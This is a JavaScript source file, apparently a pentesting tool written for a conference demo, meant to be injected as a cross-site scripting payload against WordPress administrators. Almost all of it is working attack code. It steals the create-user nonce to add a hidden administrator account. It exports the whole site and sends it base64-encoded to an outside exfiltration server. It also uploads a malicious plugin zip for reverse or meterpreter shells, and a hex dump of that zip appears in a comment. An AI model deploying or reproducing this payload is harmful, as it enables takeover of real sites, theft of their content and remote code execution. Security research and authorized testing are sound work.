/*
	JavaScript functions designed to be used as a XSS payload
	against a WordPress admin. 

	Built for an XSS to shell demo/talk. 

	Inject a script include for this file. 

	Only use this code for pentesting systems you're authorized to 
	touch. Or I will be seriously grumpy in your general direction. 


	@hoodoer

	https://github.com/hoodoer
*/




// Web server listening for exfil data
// This will be as base64 data with a .js added, trying to 
// include a non-exist remote javascript file so you 
// get the base64 data in the 404 log
var httpExfilServer = "http://192.168.78.135:8888"


function read_body(xhr) { 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}





function sendAddUserPost(nonce)
{
	// The following user will be added as an Administrator level user
	var username  = "ishouldntbehere";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

	var uri       = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wpnonce_create-user=" + nonce + "&"; 
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);
}


// Parse out the nonce value then pass to the add user function
function getNonceAndAddUser()
{
	// console.log("Starting getNonce...");
	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
		//	console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+35, noncePos+45);
			sendAddUserPost(nonceVal);
		}
	}
}



// Exports the content of the wordpress site, incase you want to clone it
// Exfils the base64 encoded content as as script include, e.g. [base64 data].js
// because we can't just GET parameter it out due to CORS in wordpress
function exportWordPressSite()
{
	var uri = "/wp-admin/export.php?download=true&content=all&cat=0&post_author=0&post_start_date=0&post_end_date=0&post_status=0&page_author=0&page_start_date=0&page_end_date=0&page_status=0&attachment_start_date=0&attachment_end_date=0&submit=Download+Export+File";
	
	xhr = new XMLHttpRequest();
	
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);

			// This will fail since the script doesn't exist, but you'll
			// get the base64 data on the 404 log on the server. 
			// You can't just do an XHR request
			// off to the external server due to the CORS policy
			var script = document.createElement("script");
			script.src = httpExfilServer + "/script/" + btoa(response) + ".js";
			document.head.appendChild(script);  
		}
	}
}



// Get the nonce required for adding a new plugin
// and upload the malicious plugin. Then you can use
// the yertle.py script to execute actions such
// as starting a reverse shell, or popping a php
// meterpreter shell
function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

		// console.log("Starting getNonce...");
	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce substring: " + nonceVal);

			// Now we have the nonce, we need to add the plugin....


			// This data buffer should be your 
			// PHP plugin zip file. 
			// You shouldn't use mine. Don't trust
			// rando binaries on github. Replace this
			// with your own. I didn't put anything
			// extra malicious in there, but why 
			// should you trust me?

			// Todo - Convert the zip file to a buffer, and 
			// document how to repeat 
			var pluginZipFile = "\x00\x00\x00";

			var fileSize = pluginZipFile.length;

			var boundary = "------827901983029388724982374023840";

			var uploadURI = "/wp-admin/update.php?action=upload-plugin";

			uploadXhr = new XMLHttpRequest();
			uploadXhr.open("POST", uploadURI, true);

			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);

			// This isn't allowed by browsers. Why did this work in my 
			// old script... hmmm...
			//uploadXhr.setRequestHeader("Content-Length", fileSize);

			var body = boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
			body += nonceVal + "\r\n"; 

			body += boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
			body += "/wp-admin/plugin-install.php" + "\r\n";


			body += boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
			body += "Content-Type: application/zip" + "\r\n\r\n";
			body += pluginZipFile + "\r\n";

			body += boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
			body += "Install Now" + "\r\n";
			body += boundary;

			var aBody = new Uint8Array(body.length);
			for (var i = 0; i < aBody.length; i++)
			{
				aBody[i] = body.charCodeAt(i);
			}
			uploadXhr.send(new Blob([aBody]));


			// Don't forget to activate the plugin you numbnut.

		}
	}
}


/*
 This is the yertle plugin zip that we need to install

root@kaliboxen:~/tools/WPForce# xxd -i shell.zip 
unsigned char shell_zip[] = {
  0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 0x04, 0x4f,
  0x78, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x09, 0x00, 0x10, 0x00, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x2e,
  0x70, 0x68, 0x70, 0x55, 0x58, 0x0c, 0x00, 0xa3, 0x41, 0xd5, 0x58, 0x97,
  0x41, 0xd5, 0x58, 0xf5, 0x01, 0x14, 0x00, 0x95, 0x51, 0x6d, 0x6b, 0xdb,
  0x30, 0x10, 0xfe, 0xee, 0x5f, 0x71, 0x94, 0x40, 0x92, 0x92, 0xc4, 0x09,
  0x8c, 0x7d, 0x48, 0xdb, 0x8d, 0xb1, 0xf5, 0x25, 0x5f, 0x46, 0xe8, 0xcb,
  0x4a, 0x29, 0xc5, 0xc8, 0xd2, 0x39, 0xd6, 0x2a, 0x4b, 0x46, 0x27, 0x27,
  0xcd, 0x4a, 0xff, 0x7b, 0x25, 0x7b, 0x71, 0x3d, 0x96, 0x32, 0x26, 0x04,
  0x92, 0xee, 0x9e, 0x7b, 0x9e, 0xe7, 0x4e, 0xc7, 0x9f, 0xcb, 0xbc, 0x8c,
  0xc0, 0xaf, 0xf8, 0xb0, 0x3e, 0x96, 0xaa, 0x5a, 0x49, 0x0d, 0xdf, 0x59,
  0x81, 0x73, 0xb8, 0x43, 0xeb, 0x14, 0xc2, 0x42, 0x3b, 0xb4, 0x8c, 0x3b,
  0xb9, 0x46, 0xb8, 0xca, 0x51, 0xa9, 0x2e, 0xf2, 0xe6, 0x72, 0x31, 0x87,
  0xdc, 0xb9, 0x92, 0xe6, 0x71, 0xbc, 0x92, 0x2e, 0xaf, 0xd2, 0x09, 0x37,
  0x45, 0xac, 0xa7, 0xd3, 0x72, 0x5b, 0x03, 0xbf, 0x21, 0x71, 0x2b, 0x4b,
  0x27, 0x8d, 0x9e, 0xc3, 0x75, 0x2e, 0x09, 0xfc, 0x66, 0x90, 0x32, 0xfe,
  0x28, 0x8c, 0xb1, 0xb0, 0xbc, 0x58, 0x02, 0x05, 0x5a, 0x10, 0x48, 0x72,
  0xa5, 0x51, 0x80, 0x33, 0x90, 0x22, 0x54, 0xe4, 0xaf, 0x1b, 0x4f, 0x09,
  0x2e, 0xc7, 0x9d, 0x99, 0x86, 0x0b, 0x32, 0x6b, 0x0a, 0xb8, 0x5d, 0x9e,
  0x19, 0xcb, 0x71, 0x52, 0xcb, 0xfc, 0x40, 0x4b, 0xb5, 0xc4, 0x74, 0x32,
  0xab, 0x03, 0x5f, 0x2a, 0x97, 0x7b, 0xfa, 0x7f, 0x1b, 0x3c, 0x8c, 0xa3,
  0x28, 0x8e, 0xe1, 0xab, 0x29, 0xa5, 0x17, 0x64, 0x5a, 0x40, 0x61, 0x84,
  0xcc, 0xc2, 0xa3, 0x96, 0xd9, 0x53, 0xac, 0xd0, 0xe8, 0x9f, 0xbf, 0x58,
  0xbc, 0x31, 0x56, 0x94, 0x16, 0x89, 0xc6, 0x75, 0x07, 0x51, 0xcf, 0x27,
  0x8b, 0xc0, 0x70, 0x02, 0xbd, 0xe4, 0xfc, 0xf4, 0xfa, 0xfe, 0x80, 0x17,
  0xe2, 0xe0, 0xe1, 0xa8, 0x9b, 0xa0, 0x2a, 0x25, 0x67, 0x07, 0xbb, 0xc8,
  0x08, 0xa6, 0x23, 0x18, 0xcf, 0x86, 0x7f, 0x60, 0x52, 0x46, 0xf8, 0xf1,
  0x43, 0x22, 0x90, 0x1b, 0x81, 0x2d, 0xd4, 0x63, 0x22, 0x99, 0xc1, 0x80,
  0x2b, 0x46, 0x94, 0xe0, 0x93, 0x24, 0x47, 0x83, 0xfe, 0x25, 0x66, 0x0a,
  0x79, 0x18, 0xef, 0x59, 0xa5, 0xeb, 0xb3, 0x3f, 0x1c, 0xc2, 0x73, 0x68,
  0xad, 0x97, 0xfd, 0x8e, 0x78, 0x4a, 0x8d, 0x1b, 0xf8, 0x1b, 0x3a, 0xe8,
  0xd3, 0x96, 0x1c, 0x16, 0x7d, 0xcf, 0x1d, 0x0a, 0x5c, 0x2e, 0xf5, 0x6a,
  0x1b, 0xec, 0xef, 0x4a, 0xc7, 0x9f, 0xa4, 0x5e, 0x9b, 0xc7, 0x37, 0x17,
  0x10, 0x6c, 0xbc, 0x00, 0x2a, 0xc2, 0x60, 0x66, 0x87, 0x6b, 0xfd, 0x70,
  0xa6, 0x54, 0xe2, 0xff, 0xce, 0x26, 0x21, 0x95, 0x30, 0x6b, 0xd9, 0xb6,
  0x75, 0xb4, 0x2f, 0xd9, 0x7a, 0x18, 0x41, 0xf3, 0x6e, 0xfb, 0xfd, 0x2f,
  0xa5, 0x77, 0x34, 0x3a, 0xec, 0xdd, 0x39, 0x36, 0xb4, 0x4d, 0x41, 0x03,
  0xe8, 0x8e, 0xf9, 0x25, 0x7a, 0x05, 0x50, 0x4b, 0x07, 0x08, 0xb6, 0x4d,
  0xf5, 0xf4, 0x8b, 0x01, 0x00, 0x00, 0x1a, 0x03, 0x00, 0x00, 0x50, 0x4b,
  0x01, 0x02, 0x15, 0x03, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 0x04, 0x4f,
  0x78, 0x4a, 0xb6, 0x4d, 0xf5, 0xf4, 0x8b, 0x01, 0x00, 0x00, 0x1a, 0x03,
  0x00, 0x00, 0x09, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x40, 0xa4, 0x81, 0x00, 0x00, 0x00, 0x00, 0x73, 0x68, 0x65, 0x6c,
  0x6c, 0x2e, 0x70, 0x68, 0x70, 0x55, 0x58, 0x08, 0x00, 0xa3, 0x41, 0xd5,
  0x58, 0x97, 0x41, 0xd5, 0x58, 0x50, 0x4b, 0x05, 0x06, 0x00, 0x00, 0x00,
  0x00, 0x01, 0x00, 0x01, 0x00, 0x43, 0x00, 0x00, 0x00, 0xd2, 0x01, 0x00,
  0x00, 0x00, 0x00
};
unsigned int shell_zip_len = 555;


*/







/*
	Calling functions

	Pick what you want to run when the XSS is executed by uncommenting
	Some functions require tweaking of variables to achice the desired 
	outcome. 
*/

// Uncomment the function you want to run on the XSS pop
//getNonceAndAddUser();
//exportWordPressSite();
//installYertleShell();

